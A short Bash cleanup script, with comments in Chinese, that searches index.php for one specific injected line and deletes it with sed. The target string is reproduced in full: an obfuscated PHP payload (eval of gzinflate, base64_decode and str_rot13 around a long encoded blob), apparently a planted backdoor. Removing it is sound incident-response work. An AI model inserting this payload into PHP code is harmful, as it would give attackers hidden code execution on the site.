#!/bin/bash

# 目标字符串简写
target_string="eval(gzinflate(base64_decode(str_rot13('5IsgG+WVTC/BKmRFDghfSSQkqvKRhT5qGAO1P2khG7kznNp6JweqmvPj1i/9ahxYSVGG21mhlmIE0m6/52I+m9iVvoNRaEQYbkZd1WeJYWNjMXRIxbPStiew+WgYfRAPgKwBsRS8HrxgNaXPOWzYdvfzKgA2ppvWnR3SdCX+PNbSu4lbG1Fyo14d+6uxqD3mz2UrXdokgJ90r5o8svrOuqUHgjIyCubELofzzGOOHw9dnEc6TabdVUwbPXxM1vWmltIKSEfNSiJcHYDZW5+F7nVJJtcIpWFW4b8DXjiNiB3hb/B+2sylVlCdDXQF4EiNcgUez9p98+l6r2TL+6w+SdIhg2ZOPMpK328ZdGGPUvs/GYU9cqg7dItXPM96VwflzEAoTgt0oKhZx1FjyRuny/dgIzVoEERvx0NfIOUFFFoK1wvJG0wRACDGaFMnvc4YT4N1X0yHm4uVE09oQwTvUeUTHWy2HtMp3HuYnwKGBS23w07FtOV/urqPNHFleAdZv37btDiSSFYtW9IdL8bW0/zumaTSLP4dqE1C8R/z4kaKoGnc3iCdCpHO1pIpXR2R8eMxeShXqf2M5YbR3LNuACaW8T3zRRsTtAgzmJ5sUKpJU37tobC+8siKN3k47D0KwsiuDr0E3OHXnK4lv1xTjTEfWj1wvQx5CeXFw2i45dc5dPqVnQ3vHZ1e76BYl07CZX1iM53YG2p9D3oPJdnmKaLOYMf5c7jezEfdT+T9cRCGygaXz/bIZ6g0K0296F+xrjWdFoomui4216xazrgpizX1puxSVEyoRjmXdyY983Ljv/EOMnNBgZUcLT9jZetq3A29X1HygFiSMDLlQd76as4TcYzqeEFc4PPVXBZE9c2DHFql2Zm3TUnvbLs9u2uVETEwGa0JwsTR8Pwj8PW6cN5uHpNrFOvSwVaVWmZrBIwtdQWj1AB9tnZcPp3YlH254L/OAGGdN1ybFGEcx3YbGsvWWEQGM8oTUuxlTAubYm9hAaNsLsJ8widBKpo28dQAjP5925f6RSxnSqNUznjy1ILFZBGtypjQG1nHRtSgxe20TxpfWOvlyhNjE6IU7Fx3BqJ1mPcVOjQ8HzDdLpSc2id0GUmKzkgm8ezjCgZ2w2PFxnlb0D5rDDWZwTArq9XItVMN6vhDuJE0A6Rjyp/KuiW/gWiu+aQ22ovT3Ir8Lw+c5+SdD68uSIb2jVVBCIt/l9XdUhw1Wabark5nswno6Dx7pLBQKWq3Sd34e18X2foMW7aKn/+YT0FhQIo3O3Gq73F07MrR17o68479izCSiZIfgikUpYQyUoGL7iIhtU+t3GPYqmQyLMv8OZvnf+XvvmTYFE6vkOQWcKXKQi2AVMvIsUc1IgnhmwghmfclJ6i5lMKwx9thJ2gPhEa14hyp/z0IqDuGI8buNDcnvt4mPA6zhYJnhiN+nzKQLfH99BjhazBKY1xhMvi1agh66m7FjUo8hZBb75P5UeuOpsgF3mvq3WP5VMp7oCMsE4sMJR6JR5G5uAI1PZ8j9aqdH6s1bsU+hUSDSfOh66tZkEbF3160CcdqZxvC6e/In7Kwru1Pxcn3auiWLixY'))))"

# 转义目标字符串的特殊字符
escaped_string=$(echo "$target_string" | sed 's/[]\/$*.^|[]/\\&/g')

# 遍历文件并删除目标字符
for file in ./index.php; do
    # 确保文件存在
    if [[ -f "$file" ]]; then
        echo "正在处理文件: $file"
        
        # 检查文件内容是否包含目标字符串
        if grep -q "$escaped_string" "$file"; then
            # 使用 sed 删除包含目标字符的整行
            sed -i "/$escaped_string/d" "$file"
            echo "已删除文件 $file 中的目标字符"
        else
            echo "跳过文件（不包含目标字符串）：$file"
        fi
    else
        echo "跳过：$file 文件不存在"
    fi
done

echo "所有符合条件的文件已处理完成！"
